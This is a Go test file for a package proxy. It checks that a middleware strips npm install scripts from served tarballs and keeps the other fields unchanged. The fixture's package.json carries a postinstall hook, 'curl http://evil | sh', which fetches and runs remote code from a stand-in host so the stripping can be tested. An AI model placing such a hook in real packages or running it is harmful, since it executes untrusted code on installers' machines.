package npm

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"sort"
	"testing"
	"time"

	"github.com/psenna/dependaproxy/internal/middleware/mutation/stripscripts"
	"github.com/psenna/dependaproxy/internal/pipeline"
	"github.com/psenna/dependaproxy/internal/project"
)

// makeNpmTarGz builds an npm-style gzipped tar from a name->content map with a
// deterministic gzip header and sorted entry order.
func makeNpmTarGz(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw, err := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
	if err != nil {
		t.Fatal(err)
	}
	zw.ModTime = time.Unix(0, 0)
	zw.OS = 255
	tw := tar.NewWriter(zw)
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		content := files[name]
		hdr := &tar.Header{Name: name, Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg, ModTime: time.Unix(0, 0)}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// npmTarballWithInstallScripts builds a real npm tarball: a package.json with
// a postinstall install-script plus a test script, and an entry file.
func npmTarballWithInstallScripts(t *testing.T) []byte {
	t.Helper()
	return makeNpmTarGz(t, map[string]string{
		"package/package.json": `{"name":"testpkg","version":"1.0.0","scripts":{"postinstall":"curl http://evil | sh","test":"node test.js"},"dependencies":{"left-pad":"1.0.0"}}`,
		"package/index.js":     "module.exports = 1\n",
	})
}

// readServedTarEntries gunzips+untars data and returns every entry's contents.
func readServedTarEntries(t *testing.T, data []byte) map[string]string {
	t.Helper()
	zr, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = zr.Close() }()
	tr := tar.NewReader(zr)
	entries := map[string]string{}
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			return entries
		}
		if err != nil {
			t.Fatal(err)
		}
		body, err := io.ReadAll(tr)
		if err != nil {
			t.Fatal(err)
		}
		entries[hdr.Name] = string(body)
	}
}

func TestNpmStripInstallScriptsServeUntrusted(t *testing.T) {
	dir := t.TempDir()
	store := newMemStore()
	upstream := npmTarballWithInstallScripts(t)
	pack, raw := buildPack(time.Now().AddDate(0, 0, -30), upstream)
	client := &rawClient{pack: pack, raw: raw, tarball: upstream}
	global := &project.Resolved{Mutation: pipeline.MutationPipeline{Chain: []pipeline.MutationMiddleware{stripscripts.Middleware{}}}}
	a := newTestAdapterWithGlobal(t, "/npm", dir, 0, client, store, global)
	srv := newTestServer(t, a)

	code, body := fetchViaProxy(t, srv.URL+"/npm", "testpkg", "1.0.0")
	if code != 200 {
		t.Fatalf("code=%d want 200", code)
	}
	entries := readServedTarEntries(t, body)
	var pkg map[string]any
	if err := json.Unmarshal([]byte(entries["package/package.json"]), &pkg); err != nil {
		t.Fatal(err)
	}
	scripts, ok := pkg["scripts"].(map[string]any)
	if !ok {
		t.Fatalf("scripts missing: %v", pkg)
	}
	if len(scripts) != 1 || scripts["test"] != "node test.js" {
		t.Fatalf("scripts = %v, want exactly {test: node test.js}", scripts)
	}
	if _, exists := scripts["postinstall"]; exists {
		t.Error("postinstall still present after strip")
	}
	if pkg["name"] != "testpkg" || pkg["version"] != "1.0.0" {
		t.Errorf("name/version not preserved: %v", pkg)
	}
	deps, ok := pkg["dependencies"].(map[string]any)
	if !ok || deps["left-pad"] != "1.0.0" {
		t.Errorf("dependencies not preserved: %v", pkg["dependencies"])
	}
	if entries["package/index.js"] != "module.exports = 1\n" {
		t.Errorf("package/index.js changed: %q", entries["package/index.js"])
	}
}

func TestNpmStripInstallScriptsServeTrustedReapply(t *testing.T) {
	dir := t.TempDir()
	store := newMemStore()
	upstream := npmTarballWithInstallScripts(t)
	pack, raw := buildPack(time.Now().AddDate(0, 0, -30), upstream)
	client := &rawClient{pack: pack, raw: raw, tarball: upstream}
	global := &project.Resolved{Mutation: pipeline.MutationPipeline{Chain: []pipeline.MutationMiddleware{stripscripts.Middleware{}}}}
	a := newTestAdapterWithGlobal(t, "/npm", dir, 0, client, store, global)
	srv := newTestServer(t, a)

	// First fetch: untrusted (validates + seeds the store + localcache).
	code1, body1 := fetchViaProxy(t, srv.URL+"/npm", "testpkg", "1.0.0")
	if code1 != 200 {
		t.Fatalf("first fetch: code=%d want 200", code1)
	}
	// Second fetch: trusted (record present) -> the mutation re-applies to the
	// re-verified upstream bytes; output must be byte-identical (determinism).
	code2, body2 := fetchViaProxy(t, srv.URL+"/npm", "testpkg", "1.0.0")
	if code2 != 200 {
		t.Fatalf("second fetch: code=%d want 200", code2)
	}
	if !bytes.Equal(body1, body2) {
		t.Fatal("trusted re-apply served different bytes than the first fetch")
	}
	entries := readServedTarEntries(t, body2)
	var pkg map[string]any
	if err := json.Unmarshal([]byte(entries["package/package.json"]), &pkg); err != nil {
		t.Fatal(err)
	}
	scripts, ok := pkg["scripts"].(map[string]any)
	if !ok {
		t.Fatalf("scripts missing on trusted re-apply: %v", pkg)
	}
	if len(scripts) != 1 || scripts["test"] != "node test.js" {
		t.Fatalf("trusted re-apply scripts = %v, want exactly {test: node test.js}", scripts)
	}
}
